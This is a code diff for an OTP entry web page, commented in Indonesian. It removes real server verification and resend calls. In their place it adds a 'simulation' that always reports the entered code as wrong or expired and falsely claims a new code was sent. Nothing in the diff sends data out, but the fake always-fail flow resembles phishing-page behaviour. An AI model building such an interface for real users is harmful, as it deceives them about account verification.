@@ -1,5 +1,5 @@
 /* ========================= */
-/* OTP ELEMENTS */
+/* ELEMENT */
 /* ========================= */
 
 const otpInputs =
@@ -31,24 +31,23 @@ document.querySelector(".timer");
 
 
 /* ========================= */
-/* VARIABLES */
+/* VARIABLE */
 /* ========================= */
 
 let alertTimer = null;
 let countdown = null;
-
 let time = 60;
 let isProcessing = false;
 
 
 /* ========================= */
-/* TEMPORARY ALERT */
+/* ALERT */
 /* ========================= */
 
 function showTempAlert(
     title,
-    description,
-    color = "blue"
+    desc,
+    color = "red"
 ) {
 
     if (
@@ -62,7 +61,7 @@ function showTempAlert(
     clearTimeout(alertTimer);
 
     alertTitle.textContent = title;
-    alertDesc.textContent = description;
+    alertDesc.textContent = desc;
     alertTitle.style.color = color;
 
     errorBox.style.display = "block";
@@ -80,12 +79,9 @@ function showTempAlert(
         }, 300);
 
     }, 3000);
+
 }
 
-
-/* ========================= */
-/* HIDE ALERT */
-/* ========================= */
 
 function hideAlert() {
 
@@ -97,6 +93,7 @@ function hideAlert() {
 
     errorBox.classList.remove("show");
     errorBox.style.display = "none";
+
 }
 
 
@@ -109,6 +106,7 @@ function showLoading() {
     if (loadingBox) {
         loadingBox.style.display = "flex";
     }
+
 }
 
 
@@ -117,6 +115,7 @@ function hideLoading() {
     if (loadingBox) {
         loadingBox.style.display = "none";
     }
+
 }
 
 
@@ -127,30 +126,21 @@ function hideLoading() {
 function resetOTP() {
 
     otpInputs.forEach(input => {
+
         input.value = "";
         input.disabled = false;
+
     });
 
     if (otpInputs.length > 0) {
         otpInputs[0].focus();
     }
+
 }
 
 
 /* ========================= */
-/* DISABLE OTP */
-/* ========================= */
-
-function disableOTP() {
-
-    otpInputs.forEach(input => {
-        input.disabled = true;
-    });
-}
-
-
-/* ========================= */
-/* GET OTP VALUE */
+/* AMBIL NILAI OTP */
 /* ========================= */
 
 function getOTPValue() {
@@ -162,11 +152,12 @@ function getOTPValue() {
     });
 
     return otp;
+
 }
 
 
 /* ========================= */
-/* SHAKE OTP */
+/* SHAKE */
 /* ========================= */
 
 function shakeOTP() {
@@ -182,12 +173,15 @@ function shakeOTP() {
     otpContainer.classList.add("shake");
 
     if ("vibrate" in navigator) {
-        navigator.vibrate(200);
+        navigator.vibrate(250);
     }
 
     setTimeout(() => {
+
         otpContainer.classList.remove("shake");
+
     }, 350);
+
 }
 
 
@@ -203,7 +197,7 @@ window.addEventListener("load", () => {
 
 
 /* ========================= */
-/* RESET WHEN PAGE RETURNS */
+/* RESET SAAT HALAMAN KEMBALI */
 /* ========================= */
 
 window.addEventListener("pageshow", () => {
@@ -221,19 +215,22 @@ window.addEventListener("pageshow", () => {
 
 
 /* ========================= */
-/* PHONE NUMBER */
+/* NOMOR OTOMATIS */
 /* ========================= */
 
 const savedNumber =
 localStorage.getItem("nmrx");
 
 if (savedNumber && phoneNumber) {
-    phoneNumber.textContent = savedNumber;
+
+    phoneNumber.textContent =
+    savedNumber;
+
 }
 
 
 /* ========================= */
-/* INITIAL STATE */
+/* KONDISI AWAL */
 /* ========================= */
 
 hideLoading();
@@ -241,164 +238,166 @@ hideAlert();
 
 
 /* ========================= */
-/* FOCUS OTP CONTAINER */
+/* FOKUS OTP */
 /* ========================= */
 
 if (otpContainer) {
 
-    otpContainer.addEventListener("click", () => {
+    otpContainer.addEventListener(
+        "click",
+        () => {
 
-        if (isProcessing) {
-            return;
-        }
-
-        for (
-            let index = 0;
-            index < otpInputs.length;
-            index++
-        ) {
-
-            if (otpInputs[index].value === "") {
-
-                otpInputs[index].focus();
+            if (isProcessing) {
                 return;
+            }
+
+            for (
+                let index = 0;
+                index < otpInputs.length;
+                index++
+            ) {
+
+                if (
+                    otpInputs[index].value === ""
+                ) {
+
+                    otpInputs[index].focus();
+                    return;
+
+                }
 
             }
-        }
 
-        if (otpInputs.length > 0) {
-            otpInputs[otpInputs.length - 1].focus();
-        }
+            if (otpInputs.length > 0) {
 
-    });
+                otpInputs[
+                    otpInputs.length - 1
+                ].focus();
+
+            }
+
+        }
+    );
 
 }
 
 
 /* ========================= */
-/* OTP INPUT HANDLING */
+/* INPUT OTP */
 /* ========================= */
 
 otpInputs.forEach((input, index) => {
 
-    input.setAttribute("inputmode", "numeric");
-    input.setAttribute("autocomplete", "one-time-code");
-    input.setAttribute("maxlength", "1");
+    input.setAttribute(
+        "inputmode",
+        "numeric"
+    );
 
-    input.addEventListener("input", () => {
+    input.setAttribute(
+        "maxlength",
+        "1"
+    );
 
-        if (isProcessing) {
-            return;
-        }
+    input.addEventListener(
+        "input",
+        () => {
 
-        input.value =
-        input.value
-        .replace(/\D/g, "")
-        .slice(0, 1);
+            if (isProcessing) {
+                return;
+            }
 
-        hideAlert();
+            input.value =
+            input.value
+            .replace(/\D/g, "")
+            .slice(0, 1);
 
-        if (
-            input.value.length === 1 &&
-            index < otpInputs.length - 1
-        ) {
+            hideAlert();
 
-            otpInputs[index + 1].focus();
+            if (
+                input.value.length === 1 &&
+                index < otpInputs.length - 1
+            ) {
 
-        }
+                otpInputs[index + 1]
+                .focus();
 
-        checkOTP();
+            }
 
-    });
-
-
-    input.addEventListener("keydown", event => {
-
-        if (isProcessing) {
-            return;
-        }
-
-        if (
-            event.key === "Backspace" &&
-            input.value === "" &&
-            index > 0
-        ) {
-
-            otpInputs[index - 1].focus();
+            checkOTP();
 
         }
+    );
 
-        if (
-            event.key === "ArrowLeft" &&
-            index > 0
-        ) {
 
-            otpInputs[index - 1].focus();
+    input.addEventListener(
+        "keydown",
+        event => {
+
+            if (isProcessing) {
+                return;
+            }
+
+            if (
+                event.key === "Backspace" &&
+                input.value === "" &&
+                index > 0
+            ) {
+
+                otpInputs[index - 1]
+                .focus();
+
+            }
 
         }
+    );
 
-        if (
-            event.key === "ArrowRight" &&
-            index < otpInputs.length - 1
-        ) {
 
-            otpInputs[index + 1].focus();
+    input.addEventListener(
+        "paste",
+        event => {
+
+            event.preventDefault();
+
+            if (isProcessing) {
+                return;
+            }
+
+            const pastedOTP =
+            event.clipboardData
+            .getData("text")
+            .replace(/\D/g, "")
+            .slice(0, otpInputs.length);
+
+            if (!pastedOTP) {
+                return;
+            }
+
+            otpInputs.forEach(
+                (otpInput, otpIndex) => {
+
+                    otpInput.value =
+                    pastedOTP[otpIndex] || "";
+
+                }
+            );
+
+            checkOTP();
 
         }
-
-    });
-
-
-    input.addEventListener("paste", event => {
-
-        event.preventDefault();
-
-        if (isProcessing) {
-            return;
-        }
-
-        const pastedText =
-        event.clipboardData
-        .getData("text")
-        .replace(/\D/g, "")
-        .slice(0, otpInputs.length);
-
-        if (!pastedText) {
-            return;
-        }
-
-        otpInputs.forEach((otpInput, otpIndex) => {
-
-            otpInput.value =
-            pastedText[otpIndex] || "";
-
-        });
-
-        const nextEmptyIndex =
-        [...otpInputs].findIndex(
-            otpInput => otpInput.value === ""
-        );
-
-        if (nextEmptyIndex >= 0) {
-            otpInputs[nextEmptyIndex].focus();
-        } else {
-            otpInputs[otpInputs.length - 1].focus();
-        }
-
-        checkOTP();
-
-    });
+    );
 
 });
 
 
 /* ========================= */
-/* CHECK AND VERIFY OTP */
+/* CHECK OTP */
+/* SIMULASI SELALU GAGAL */
 /* ========================= */
 
-async function checkOTP() {
+function checkOTP() {
 
-    const otp = getOTPValue();
+    const otp =
+    getOTPValue();
 
     if (
         otp.length !== otpInputs.length ||
@@ -409,120 +408,39 @@ async function checkOTP() {
 
     isProcessing = true;
 
-    disableOTP();
-    showLoading();
+    otpInputs.forEach(input => {
+        input.disabled = true;
+    });
+
     hideAlert();
+    showLoading();
 
-    try {
+    setTimeout(() => {
 
-        const response = await fetch(
-            "/verify-otp",
-            {
-                method: "POST",
-
-                headers: {
-                    "Content-Type":
-                    "application/json"
-                },
-
-                credentials: "same-origin",
-
-                body: JSON.stringify({
-                    otp
-                })
-            }
-        );
-
-        let data = {};
-
-        try {
-            data = await response.json();
-        } catch {
-            data = {};
-        }
-
-        if (!response.ok) {
-
-            throw new Error(
-                data.message ||
-                "Kode verifikasi tidak dapat diproses."
-            );
-
-        }
-
-        if (data.success === true) {
-
-            showTempAlert(
-                "Berhasil",
-                data.message ||
-                "Kode berhasil diverifikasi.",
-                "green"
-            );
-
-            if (data.redirectUrl) {
-
-                setTimeout(() => {
-                    window.location.href =
-                    data.redirectUrl;
-                }, 700);
-
-            }
-
-            return;
-        }
-
-        throw new Error(
-            data.message ||
-            "Kode verifikasi tidak valid."
-        );
-
-    } catch (error) {
-
-        console.error(
-            "OTP verification error:",
-            error
-        );
+        hideLoading();
 
         shakeOTP();
 
         showTempAlert(
-            "Verifikasi Gagal",
-            error.message ||
-            "Terjadi kesalahan. Silakan coba lagi.",
+            "Kode OTP Salah atau Kadaluarsa",
+            "Pastikan Kode yang kamu masukan benar dan tidak kadaluarsa",
             "red"
         );
 
         resetOTP();
 
-    } finally {
+        isProcessing = false;
 
-        hideLoading();
-
-        if (
-            !document.hidden &&
-            !window.location.href.includes(
-                "redirect"
-            )
-        ) {
-
-            isProcessing = false;
-
-            otpInputs.forEach(input => {
-                input.disabled = false;
-            });
-
-        }
-
-    }
+    }, 2000);
 
 }
 
 
 /* ========================= */
-/* RESEND TIMER */
+/* TIMER */
 /* ========================= */
 
-function startResendTimer() {
+function startTimer() {
 
     if (!resendBtn || !timerText) {
         return;
@@ -533,34 +451,36 @@ function startResendTimer() {
     time = 60;
 
     resendBtn.disabled = true;
-    resendBtn.classList.remove("active");
 
-    timerText.textContent = "01:00";
+    resendBtn.classList
+    .remove("active");
+
+    timerText.textContent =
+    "00:60";
 
     countdown = setInterval(() => {
 
         time--;
 
-        const minutes =
-        String(
-            Math.floor(time / 60)
-        ).padStart(2, "0");
-
         const seconds =
-        String(time % 60)
+        String(time)
         .padStart(2, "0");
 
         timerText.textContent =
-        `${minutes}:${seconds}`;
+        `00:${seconds}`;
 
         if (time <= 0) {
 
             clearInterval(countdown);
 
-            timerText.textContent = "00:00";
+            timerText.textContent =
+            "00:00";
 
-            resendBtn.disabled = false;
-            resendBtn.classList.add("active");
+            resendBtn.disabled =
+            false;
+
+            resendBtn.classList
+            .add("active");
 
         }
 
@@ -570,14 +490,14 @@ function startResendTimer() {
 
 
 /* ========================= */
-/* RESEND OTP */
+/* KIRIM ULANG */
 /* ========================= */
 
 if (resendBtn) {
 
     resendBtn.addEventListener(
         "click",
-        async () => {
+        () => {
 
             if (
                 resendBtn.disabled ||
@@ -586,77 +506,15 @@ if (resendBtn) {
                 return;
             }
 
-            resendBtn.disabled = true;
-            resendBtn.classList.remove("active");
+            resetOTP();
 
-            showLoading();
-            hideAlert();
+            showTempAlert(
+                "Kode Dikirim Ulang",
+                "Silakan periksa kode verifikasi terbaru.",
+                "blue"
+            );
 
-            try {
-
-                const response = await fetch(
-                    "/resend-otp",
-                    {
-                        method: "POST",
-
-                        headers: {
-                            "Content-Type":
-                            "application/json"
-                        },
-
-                        credentials: "same-origin"
-                    }
-                );
-
-                let data = {};
-
-                try {
-                    data = await response.json();
-                } catch {
-                    data = {};
-                }
-
-                if (!response.ok) {
-
-                    throw new Error(
-                        data.message ||
-                        "Kode tidak dapat dikirim ulang."
-                    );
-
-                }
-
-                showTempAlert(
-                    "Kode Dikirim",
-                    data.message ||
-                    "Kode verifikasi baru telah dikirim.",
-                    "blue"
-                );
-
-                resetOTP();
-                startResendTimer();
-
-            } catch (error) {
-
-                console.error(
-                    "Resend OTP error:",
-                    error
-                );
-
-                showTempAlert(
-                    "Gagal Mengirim",
-                    error.message ||
-                    "Silakan coba kembali.",
-                    "red"
-                );
-
-                resendBtn.disabled = false;
-                resendBtn.classList.add("active");
-
-            } finally {
-
-                hideLoading();
-
-            }
+            startTimer();
 
         }
     );
@@ -664,5 +522,8 @@ if (resendBtn) {
 }
 
 
-/* START TIMER */
-startResendTimer();
+/* ========================= */
+/* MULAI TIMER */
+/* ========================= */
+
+startTimer();
